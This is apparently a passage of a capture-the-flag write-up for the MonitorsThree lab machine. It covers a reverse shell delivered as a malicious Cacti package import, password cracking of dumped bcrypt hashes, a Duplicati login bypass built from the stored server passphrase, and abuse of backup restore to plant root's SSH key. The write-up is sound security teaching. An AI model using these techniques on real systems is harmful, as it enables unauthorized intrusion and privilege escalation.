<publickey>LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwQzVDY0ZXdGFHdGZFV1IxcFJUSApIRXFGSjY4dG15Kyt5Qy9sbWZvVS9MYUVVVE1JeHJCSUJRb3JvZW5DL3pGdUhRQlUyY3JkdzkyWEZBdHBkSElyCnhxUnRtUzdod3NXSUU2Y1lCQVd0Vlh4UkNwZHllMGtjNWhhVllqL2JKZVFMZDRqNFFhZEJ3aWhhWGFmL3ZpRDkKckYxc2E3UjNUZnh2YVJobzFuNWFJUUJhWkFBTkErZ1pLUXZOQWFKeFZjNjFQVnNYOXIwNzB2NFhDMEhmNytieQpPd25IdWNMT0hrL3BWMHFMUFY2bG5sK0RrYWhyM0Fqc2pSUmtUR0VudFR0SnlXMlZ5VXdIdkFoWmZydW4ybkZhClptT09SL0EydUtxT0c5T3crK0s4aGlmM3lLMFNoWDJnYlFSMmh4d0F4eDlYbnRic0Z1K1hMTnVUb25GWWI1UG8KWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==</publickey>
<signature>c/PPGYnjmqs0bD1VNumaDZ11CudS8xbnzzBswFUH3a5hBppjHu45inbgj0aKw03L8qbYISZtJW8OCQNJfhk4UUTUj01j5d41R7PvABPw9rd1QJp69h/u8ttI9JPK5bUDgSnU+4fUNyy1kU9o9GmSB1rbzwrIc4xKeZPVJ2Mbp26J/ozft8ABYLyKfovef3WcSbI2vija78Rj5NyQ9LpxAhcOLeSE5nBCew/AyDEOzxJLvsS3ysrCkirTjXVIrzqbCN8VZPOoUSms6qMU7Olg3mB2/6aQBLBISxsbCRwRu79J2CWP53zsaUfMxiP7H+Ya70paCk+mNg18E5a0YanuZw==</signature>
</xml>

```

In Cacti, on the menu on the left, there’s an option for “Import/Export” –> “Import Packages”:

![image-20240828090732624](/img/image-20240828090732624.png)

I’ll select `revshell.xml.gz`, and click Import:

![image-20240828090802458](/img/image-20240828090802458.png)

Now if I visit `http://cacti.monitorsthree.htb/cacti/resource/0xdf.php`, it triggers the reverse shell, and I get a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.30 56440
bash: cannot set terminal process group (1141): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitorsthree:~/html/cacti/resource$

```

I’ll do the standard [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@monitorsthree:~/html/cacti/resource$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@monitorsthree:~/html/cacti/resource$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@monitorsthree:~/html/cacti/resource$ 

```

## Shell as marcus

### Enumeration

#### Users

There is one user on the box with a home directory in `/home`:

```

www-data@monitorsthree:/home$ ls
marcus

```

www-data cannot access marcus’ home directory. Only marcus and root are configured with shells:

```

www-data@monitorsthree:~$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash

```

#### opt

There are a few interesting folders in `/opt`:

```

www-data@monitorsthree:/opt$ ls
backups  containerd  docker-compose.yml  duplicati

```

These are interesting, but I’ll come back to them later (though there’s actually nothing stopping me from using [Chisel](https://github.com/jpillora/chisel) to tunnel now and going directly to root).

#### Main Site

There are two directories in `/var/www/html`:

```

www-data@monitorsthree:~/html$ ls
app  cacti  index.php

```

The `index.php` file is just a PHP redirect to `/cacti`.

The `app` directory has the main site:

```

www-data@monitorsthree:~/html/app$ ls
admin  css  fonts  forgot_password.php  images  index.php  js  login.php

```

In `admin/db.php`, it does the DB connection:

```

<?php

$dsn = 'mysql:host=127.0.0.1;port=3306;dbname=monitorsthree_db';
$username = 'app_user';
$password = 'php_app_password';
$options = [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
];

try {
    $pdo = new PDO($dsn, $username, $password, $options);
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
}

```

I’ll note the username and password. There’s not much else of interest on this site.

#### Cacti

The `cacti` folder has a ton of pages, but that’s typical for this application, matching what’s on [GitHub](https://github.com/Cacti/cacti):

```

www-data@monitorsthree:~/html/cacti$ ls
CHANGELOG                   automation_tree_rules.php  data_debug.php            graph_templates_inputs.php  lib                    poller_boost.php        rra                          templates_import.php
LICENSE                     boost_rrdupdate.php        data_input.php            graph_templates_items.php   link.php               poller_commands.php     rrdcheck.php                 tests
README.md                   cache                      data_queries.php          graph_view.php              links.php              poller_dsstats.php      rrdcleaner.php               tree.php
about.php                   cacti.sql                  data_source_profiles.php  graph_xport.php             locales                poller_maintenance.php  script_server.php            user_admin.php
aggregate_graphs.php        cactid.php                 data_sources.php          graphs.php                  log                    poller_realtime.php     scripts                      user_domains.php
aggregate_templates.php     cdef.php                   data_templates.php        graphs_items.php            logout.php             poller_recovery.php     service                      user_group_admin.php
auth_changepassword.php     cli                        docs                      graphs_new.php              managers.php           poller_reports.php      service_check.php            utilities.php
auth_login.php              clog.php                   formats                   help.php                    mibs                   poller_rrdcheck.php     settings.php                 vdef.php
auth_profile.php            clog_user.php              gprint_presets.php        host.php                    package_import.php     poller_spikekill.php    sites.php
automation_devices.php      cmd.php                    graph.php                 host_templates.php          permission_denied.php  pollers.php             snmpagent_mibcache.php
automation_graph_rules.php  cmd_realtime.php           graph_image.php           images                      plugins                remote_agent.php        snmpagent_mibcachechild.php
automation_networks.php     color.php                  graph_json.php            include                     plugins.php            reports_admin.php       snmpagent_persist.php
automation_snmp.php         color_templates.php        graph_realtime.php        index.php                   poller.php             reports_user.php        spikekill.php
automation_templates.php    color_templates_items.php  graph_templates.php       install                     poller_automation.php  resource                templates_export.php

```

The DB connection information is in `include/config.php`, which is very long with lots of comments, but includes this section near the top:

```

$database_type     = 'mysql';                              
$database_default  = 'cacti';                              
$database_hostname = 'localhost';                          
$database_username = 'cactiuser';                          
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;                                 
$database_ssl      = false;                                
$database_ssl_key  = '';                                   
$database_ssl_cert = '';
$database_ssl_ca   = '';                                   
$database_persist  = false; 

```

Nothing else here of interest.

#### Database

Each application uses a different user to connect to the database. I already observed from the SQL injection that the app\_user can see two databases, which I’ll confirm:

```

www-data@monitorsthree:~$ mysql -u app_user -pphp_app_password monitorsthree_db
...[snip]...
MariaDB [monitorsthree_db]> show databases; 
+--------------------+
| Database           |
+--------------------+
| information_schema |
| monitorsthree_db   |
+--------------------+
2 rows in set (0.001 sec)

```

I’ll check out the other tables in `monitorsthree_db` but there’s nothing interesting.

cactiuser has access to different databases:

```

www-data@monitorsthree:~$ mysql -u cactiuser -pcactiuser cacti                 
...[snip]...
MariaDB [cacti]> show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.000 sec)

```

`cacti` has 113 tables:

```

MariaDB [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
| automation_tree_rule_items          |
| automation_tree_rules               |
| cdef                                |
| cdef_items                          |
| color_template_items                |
| color_templates                     |
| colors                              |
| data_debug                          |
| data_input                          |
| data_input_data                     |
| data_input_fields                   |
| data_local                          |
| data_source_profiles                |
| data_source_profiles_cf             |
| data_source_profiles_rra            |
| data_source_purge_action            |
| data_source_purge_temp              |
| data_source_stats_daily             |
| data_source_stats_hourly            |
| data_source_stats_hourly_cache      |
| data_source_stats_hourly_last       |
| data_source_stats_monthly           |
| data_source_stats_weekly            |
| data_source_stats_yearly            |
| data_template                       |
| data_template_data                  |
| data_template_rrd                   |
| external_links                      |
| graph_local                         |
| graph_template_input                |
| graph_template_input_defs           |
| graph_templates                     |
| graph_templates_gprint              |
| graph_templates_graph               |
| graph_templates_item                |
| graph_tree                          |
| graph_tree_items                    |
| host                                |
| host_graph                          |
| host_snmp_cache                     |
| host_snmp_query                     |
| host_template                       |
| host_template_graph                 |
| host_template_snmp_query            |
| plugin_config                       |
| plugin_db_changes                   |
| plugin_hooks                        |
| plugin_realms                       |
| poller                              |
| poller_command                      |
| poller_data_template_field_mappings |
| poller_item                         |
| poller_output                       |
| poller_output_boost                 |
| poller_output_boost_local_data_ids  |
| poller_output_boost_processes       |
| poller_output_realtime              |
| poller_reindex                      |
| poller_resource_cache               |
| poller_time                         |
| processes                           |
| reports                             |
| reports_items                       |
| rrdcheck                            |
| sessions                            |
| settings                            |
| settings_tree                       |
| settings_user                       |
| settings_user_group                 |
| sites                               |
| snmp_query                          |
| snmp_query_graph                    |
| snmp_query_graph_rrd                |
| snmp_query_graph_rrd_sv             |
| snmp_query_graph_sv                 |
| snmpagent_cache                     |
| snmpagent_cache_notifications       |
| snmpagent_cache_textual_conventions |
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_auth_row_cache                 |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
113 rows in set (0.001 sec)

```

Most of it has to do with the devices and management of them in Cacti, but `user_auth` jumps out as interesting:

```

MariaDB [cacti]> select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.001 sec)

```

There’s three users, including the admin user whose password I already know.

### Shell

#### Crack Password

The hashes look like bcrypt passwords, though I know that `hashcat` isn’t going to be able to automatically recognize. As I know the admin’s password already, I can use Python to check the password and the hash:

```

oxdf@hacky$ python
Python 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bcrypt
>>> bcrypt.checkpw(b"greencacti2001", b"$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G")
True

```

It works. I’ll use `hashcat` to try the other two:

```

$ cat cacti_hashes 
guest:$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu
marcus:$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
$ hashcat cacti_hashes -m3200 --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
...[snip]...

```

The marcus one cracks right away as “12345678910”.

#### su

That password works for marcus with `su`:

```

www-data@monitorsthree:~$ su - marcus
Password: 
marcus@monitorsthree:~$

```

And I can read `user.txt`:

```

marcus@monitorsthree:~$ cat user.txt
1bdeb325************************

```

#### SSH

I’m not able to SSH as marcus, as password authentication is disabled for all users:

```

marcus@monitorsthree:~$ cat /etc/ssh/sshd_config | grep ^PasswordAuthentication
PasswordAuthentication no

```

There is a key pair in `.ssh`:

```

marcus@monitorsthree:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

```

And it works to log in with a more stable shell:

```

oxdf@hacky$ ssh -i ~/keys/monitorsthree-marcus marcus@monitorsthree.htb
Last login: Wed Aug 28 03:00:54 2024 from 10.10.14.6
marcus@monitorsthree:~$

```

## Shell as root

### Enumeration

#### Filesystem

There’s nothing else too interesting in marcus’ home directory:

```

marcus@monitorsthree:~$ ls -la
total 32
drwxr-x--- 4 marcus marcus 4096 Aug 16 11:35 .
drwxr-xr-x 3 root   root   4096 May 26 16:34 ..
lrwxrwxrwx 1 root   root      9 Aug 16 11:29 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Jan  6  2022 .bashrc
drwx------ 2 marcus marcus 4096 Aug 16 11:35 .cache
-rw-r--r-- 1 marcus marcus  807 Jan  6  2022 .profile
drwx------ 2 marcus marcus 4096 Aug 28 14:14 .ssh
-rw-r----- 1 root   marcus   33 May 26 18:11 user.txt

```

There aren’t interesting files owned by marcus either:

```

marcus@monitorsthree:~$ find / -user marcus 2>/dev/null | grep -vP "^/(home|sys|proc|run)"
/dev/pts/1
marcus@monitorsthree:~$ find / -group marcus 2>/dev/null | grep -vP "^/(home|sys|proc|run)"
marcus@monitorsthree:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)

```

marcus doesn’t have any other interesting groups, and can’t run anything with `sudo`:

```

marcus@monitorsthree:~$ sudo -l
[sudo] password for marcus: 
Sorry, user marcus may not run sudo on monitorsthree.

```

#### Processes

marcus is only able to see processes running as marcus:

```

marcus@monitorsthree:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
marcus      2667  0.0  0.2  17120  9592 ?        Ss   14:22   0:00 /lib/systemd/systemd --user
marcus      2675  0.0  0.1   8800  5556 pts/0    S+   14:22   0:00 -bash
marcus      2692  0.0  0.1   8812  5588 pts/1    Ss   14:22   0:00 -bash
marcus      3080  0.0  0.0  10072  1612 pts/1    R+   14:37   0:00 ps auxww

```

That’s because the `/proc` filesystem is mounted with `hidepid` of 2 / `invisible`:

```

marcus@monitorsthree:~$ mount | grep ^proc
proc on /proc type proc (rw,relatime,hidepid=invisible)

```

#### Network

`nmap` scans showed that 8084 was filtered. In `/etc/iptables/rules.v4`, there are lines that show this block, but allow it from localhost:

```
-A INPUT -p tcp -m tcp --dport 8084 -j DROP                
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 8084 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 8084 -j DROP                
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 8084 -j ACCEPT 

```

Besides 8084, there are four other services listening on localhost only:

```

marcus@monitorsthree:~$ ss -tnlp
State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process      
LISTEN      0           4096                 127.0.0.1:8200                 0.0.0.0:*                     
LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*                     
LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*                     
LISTEN      0           500                    0.0.0.0:8084                 0.0.0.0:*                     
LISTEN      0           4096                 127.0.0.1:36483                0.0.0.0:*                     
LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*                     
LISTEN      0           70                   127.0.0.1:3306                 0.0.0.0:*                     
LISTEN      0           511                       [::]:80                      [::]:*                     
LISTEN      0           128                       [::]:22                      [::]:*

```

3306 is MySQL which I’ve already enumerated. 53 is DNS. I’ll focus on 8084 and 8200 as low ports. Neither `nc` or `curl` returned anything on 8084. But 8200 returns a redirect to `/login.html`:

```

marcus@monitorsthree:~$ curl -v http://localhost:8200
*   Trying 127.0.0.1:8200...
* Connected to localhost (127.0.0.1) port 8200 (#0)
> GET / HTTP/1.1
> Host: localhost:8200
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Redirect
< location: /login.html
< Date: Wed, 28 Aug 2024 14:51:40 GMT
< Content-Length: 0
< Content-Type: 
< Server: Tiny WebServer
< Connection: close
< Set-Cookie: xsrf-token=2Ao4fvBJt4w7VDeACGotVuyHKkN0IGkx01Pugvqnt9I%3D; expires=Wed, 28 Aug 2024 15:01:40 GMT;path=/; 
< 
* Closing connection 0

```

### Duplicati Enumeration

#### Site

I’ll use SSH with `-L 8200:localhost:8200` to create a tunnel from my host 8200 to this instance on MonitorsThree. Visiting the page offers a login for Duplicati:

![image-20240828110120965](/img/image-20240828110120965.png)

[Duplicati](https://duplicati.com/) is a “Zero trust, fully encrypted backup” system. I’ll try a guess password, but it fails:

![image-20240828124634063](/img/image-20240828124634063.png)

It’s interesting to look at the two POST requests generated on trying to log in, both to `/login.cgi`. The first has a body requesting a nonce:

```

POST /login.cgi HTTP/1.1
Host: localhost:8200
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 11
Origin: http://localhost:8200
Connection: keep-alive
Referer: http://localhost:8200/login.html

get-nonce=1

```

The response includes that nonce:

```

HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate, max-age=0
Date: Wed, 28 Aug 2024 16:46:13 GMT
Content-Length: 140
Content-Type: application/json
Server: Tiny WebServer
Keep-Alive: timeout=20, max=400
Connection: Keep-Alive
Set-Cookie: xsrf-token=kjZA5E7i%2FXdXpfRHhGX14bo5b0wChi%2F0E2%2Fv2%2FGCiMk%3D; expires=Wed, 28 Aug 2024 16:56:13 GMT;path=/; 
Set-Cookie: session-nonce=IAuWUthCFuB59dL%2FbvPNj2n3hQOW%2FwBc4bBtzFQ1tI4%3D; expires=Wed, 28 Aug 2024 16:56:13 GMT;path=/; 

{
  "Status": "OK",
  "Nonce": "IAuWUthCFuB59dL/bvPNj2n3hQOW/wBc4bBtzFQ1tI4=",
  "Salt": "xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I="
}

```

Immediately the browser makes another request, using the cookies set in the previous request and sending not the password but some encrypted or hashed value:

```

POST /login.cgi HTTP/1.1
Host: localhost:8200
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://localhost:8200
Connection: keep-alive
Referer: http://localhost:8200/login.html
Cookie: xsrf-token=kjZA5E7i%2FXdXpfRHhGX14bo5b0wChi%2F0E2%2Fv2%2FGCiMk%3D; session-nonce=IAuWUthCFuB59dL%2FbvPNj2n3hQOW%2FwBc4bBtzFQ1tI4%3D

password=8MRQPI3uEGegK2BxWtuuiTGwdGpIaN%2FAURmrxikIlGw%3D

```

Without the password, there’s not much to do on the site.

#### Filesystem

I noted [above](#opt) the Duplicati folder in `/opt`:

```

www-data@monitorsthree:/opt$ ls
backups  containerd  docker-compose.yml  duplicati

```

`backups` has what look like Cacti backups:

```

www-data@monitorsthree:/opt$ ls -l backups/cacti/
total 19720
-rw-r--r-- 1 root root   172507 May 26 16:29 duplicati-20240526T162923Z.dlist.zip
-rw-r--r-- 1 root root   172088 Aug 20 11:30 duplicati-20240820T113028Z.dlist.zip
-rw-r--r-- 1 root root   172085 Aug 28 14:14 duplicati-20240828T141430Z.dlist.zip
-rw-r--r-- 1 root root    10868 Aug 28 14:14 duplicati-b40ba7a7ceb2e4d5e8fd493774d03ab84.dblock.zip
-rw-r--r-- 1 root root 19423816 May 26 16:29 duplicati-bb19cdec32e5341b7a9b5d706407e60eb.dblock.zip
-rw-r--r-- 1 root root    25004 Aug 20 11:30 duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip
-rw-r--r-- 1 root root     1265 Aug 28 14:14 duplicati-i3395a793594c4180a06f3f31485275b6.dindex.zip
-rw-r--r-- 1 root root     2493 Aug 20 11:30 duplicati-i7329b8d56a284479bade001406b5dec4.dindex.zip
-rw-r--r-- 1 root root   185083 May 26 16:29 duplicati-ie7ca520ceb6b4ae081f78324e10b7b85.dindex.zip
www-data@monitorsthree:/opt$ date
Wed Aug 28 15:10:28 UTC 2024

```

The `docker-compose.yml` file is for Duplicati:

```

version: "3"

services:
  duplicati:
    image: lscr.io/linuxserver/duplicati:latest
    container_name: duplicati
    environment:
      - PUID=0
      - PGID=0
      - TZ=Etc/UTC
    volumes:
      - /opt/duplicati/config:/config
      - /:/source
    ports:
      - 127.0.0.1:8200:8200
    restart: unless-stopped

```

It shows port 8022, and that the `config` directory is loaded from the host. That directory has a few things:

```

www-data@monitorsthree:/opt$ ls -a duplicati/config 
.  ..  .config  CTADPNHLTC.sqlite  Duplicati-server.sqlite  control_dir_v2

```

The root of the host file system is also mapped into the container to `/source`.

#### DB

I’ll download a copy of the database and take a look:

```

oxdf@hacky$ sqlite3 Duplicati-server.sqlite 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
Backup        Log           Option        TempFile    
ErrorLog      Metadata      Schedule      UIStorage   
Filter        Notification  Source        Version  

```

The `Option` table has interesting stuff:

```

sqlite> select * from Option;
4||encryption-module|
4||compression-module|zip
4||dblock-size|50mb
4||--no-encryption|true
-1||--asynchronous-upload-limit|50
-1||--asynchronous-concurrent-upload-limit|50
-2||startup-delay|0s
-2||max-download-speed|
-2||max-upload-speed|
-2||thread-priority|
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|9cdbbd46-da90-4fed-b040-30176b22394c
-2||server-passphrase-trayicon-hash|9nWqm+3kCCGVB4QdCulf3gThzVkek3pzE10iwijGYGw=
-2||last-update-check|638604513293063340
-2||update-check-interval|
-2||update-check-latest|
-2||unacked-error|False
-2||unacked-warning|False
-2||server-listen-interface|any
-2||server-ssl-certificate|
-2||has-fixed-invalid-backup-id|True
-2||update-channel|
-2||usage-reporter-level|
-2||has-asked-for-password-protection|true
-2||disable-tray-icon-login|false
-2||allowed-hostnames|*

```

I’ll need `server-passphrase`, and note that the `server-passphrase-salt` matches what was sent in the nonce request above.

### Duplicati Login

#### Background

[This Medium post](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) goes into detail about how to take the `server-passphrase` and use it to log in. Duplicati does client-side hashing on the input password before it sends that to the server. To prevent replays, it uses a nonce in a two-request process observed [above](#site-2).

The input password is combined with the salt and hashed with SHA256:

```

var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));

```

Then the result is combined with the nonce to get what is sent back:

```

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);

```

To test this, I’ll enter “password” and submit, but with Burp Proxy in intercept mode. I’ll let the first request come through, and it stops at the second. In the response from the first, I’ll grab the nonce and the salt, and then in the dev tools calculate the password:

![image-20240828140505216](/img/image-20240828140505216.png)

That matches the intercepted second request:

![image-20240828140525633](/img/image-20240828140525633.png)

What the post learns through trial and error is that the value in the database as the `server-passphrase` in the DB, when base64-decoded and then hex-encoded, is the value of `saltedpwd`.

There are two attacks to try here:
- I could try to brute force the password working backwards from hash in the DB, but in this case it won’t crack.
- I could bypass the authentication by using the value from the DB to calculate the correct value to submit in the second request and get in.

#### Auth Bypass

I’ll convert the value in the DB to hex:

```

oxdf@hacky$ echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=" | base64 -d | xxd -p
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a

```

That’s the standard salted SHA256 of the password. I’ll start the auth flow again with intercept on, stopping at the second request. I’ll grab the nonce value and go back into the dev tools console to calculate the `noncepwd`:

![image-20240828142142276](/img/image-20240828142142276.png)

I’ll replace the `password` value in the intercepted request, forward it, and turn intercept off. Firefox shows a successful login:

![image-20240828142236975](/img/image-20240828142236975.png)

### Abusing Duplicati

There are many ways to get root access through Duplicati. I’ll show three:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[<a href="#duplicati-login">Duplicati Access</a>]-->B(<a href='#root-backup'>Backup /root</a>);
    B-->C[root.txt];
    A-->D(<a href='#root-ssh'>Write root SSH\nkey on host</a>);
    D-->E[Shell as root];
    E-->C;
    A-->F[<a href='#root-in-duplicati-container'>Shell in\nDuplicati Container</a>];
    F-->E;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Root Backup

There’s a single backup running for Cacti, which is what was creating files in `/opt/backups/cacti`. I’ll create another one by clicking the nine dots at the top right and selecting “Add backup”:

![image-20240828160224589](/img/image-20240828160224589.png)

I’ll select “Configure a new backup”:

![image-20240828160240863](/img/image-20240828160240863.png)

I’ll give it a name, and set the encryption to none:

![image-20240828160307356](/img/image-20240828160307356.png)

On the next page, I need to pick a backup destination:

![image-20240828160331868](/img/image-20240828160331868.png)

This is my first interaction with the Duplicati filesystem. “Computer” is the Duplicati container. The `/source` directory is the host, as I noted from the `docker-compose.yml` file [above](#filesystem-1). I’ll pick `/source/opt/backups/`, and click “Test connection”:

![image-20240828160637468](/img/image-20240828160637468.png)

On clicking “Next”, the next screen wants to know the source of the data. I’ll select `/source/root`:

![image-20240828160724622](/img/image-20240828160724622.png)

On the next screen, I’ll uncheck “Automatically run backups”:

![image-20240828160747399](/img/image-20240828160747399.png)

The defaults are fine for the last screen:

![image-20240828160802848](/img/image-20240828160802848.png)

On hitting Save (and maybe after a hard refresh), there’s another backup on the home screen:

![image-20240828160834494](/img/image-20240828160834494.png)

I’ll click “Run now”, and it runs:

![image-20240828160849383](/img/image-20240828160849383.png)

Expanding the options for the backup, I’ll click “Restore files…”:

![image-20240828160928989](/img/image-20240828160928989.png)

I can see the files available in the backup:

![image-20240828160959359](/img/image-20240828160959359.png)

There’s no SSH key, but I can get `root.txt`. I’ll check that and “Continue”. The next page asks where to restore the files. I’ll pick somewhere marcus can read:

![image-20240828161124911](/img/image-20240828161124911.png)

On running this, `root.txt` is in `/tmp`:

```

marcus@monitorsthree:/tmp$ cat root.txt
f039facf************************

```

### Root SSH

There’s no key in `/root/.ssh`, but perhaps I can write one. As a shortcut, I’ll just backup marcus’ `authorized_keys` file and restore it to `/root/.ssh/`.

I can edit my existing backup, or start a new one (they are cleared out every 10 minutes, which is annoying). I’ll set the “Source data” to `/source/home/marcus`:

![image-20240828161927264](/img/image-20240828161927264.png)

Once it’s saved, I’ll “Run now”, and then go back to “Restore files…”. I’ll select the `authorized_keys` file:

![image-20240828162240011](/img/image-20240828162240011.png)

On the next screen, I’ll set the destination as `/source/root/.ssh`, and make sure that it is set to overwrite (I saw above that there is an existing file):

![image-20240828162440963](/img/image-20240828162440963.png)

Now I can SSH in as root using the key I got for marcus:

```

oxdf@hacky$ ssh -i ~/keys/monitorsthree-marcus root@monitorsthree.htb
Last login: Wed Aug 28 20:24:38 2024 from 10.10.14.6
root@monitorsthree:~#

```

This method is closest to the author’s intended method, which was to backup a `cron` file and then restore it to `/source/etc/cron.d` to get executed and give a reverse shell.

### Root in Duplicati Container

Playing around with the settings, I am able to get execution in the Duplicati container, which then grants access to the filesystem of the host via the `/source` directory.

I’ll create a simple reverse shell script in `/dev/shm`:

```

#!/bin/bash

